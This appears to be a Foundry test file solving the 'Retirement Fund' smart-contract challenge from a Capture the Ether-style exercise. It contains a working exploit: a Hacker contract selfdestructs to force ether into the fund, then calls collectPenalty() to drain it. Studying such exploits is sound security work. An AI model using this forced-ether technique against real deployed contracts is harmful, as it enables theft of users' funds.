// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/RetirementFund.sol";

contract RetirementFundTest is Test {
    RetirementFundChallenge private returfund;
    address private constant ALICE = address(0x1);
    address private constant HACKER = address(0x2);
    address private constant BENEFICIARY = address(0x3);
    
    function setUp() external {
        vm.deal(ALICE, 1e18);
        vm.deal(HACKER, 1e18);
        vm.deal(BENEFICIARY, 1e18);
        vm.startPrank(ALICE);
        returfund = (new RetirementFundChallenge){value: 1e18}(HACKER);
    }

    function testHack() external {
        vm.stopPrank();
        vm.startPrank(HACKER);
        Hacker hacker = (new Hacker){value: 1}();
        hacker.destroy(address(returfund));
        (bool success,) = address(returfund).call(abi.encodeWithSignature("collectPenalty()"));
        require(success, "tx failed");
        assertEq(address(returfund).balance, 0);
    }
}

contract Hacker {
    constructor() payable {

    }
    function destroy(address target) external {
        selfdestruct(payable(target));
    }
}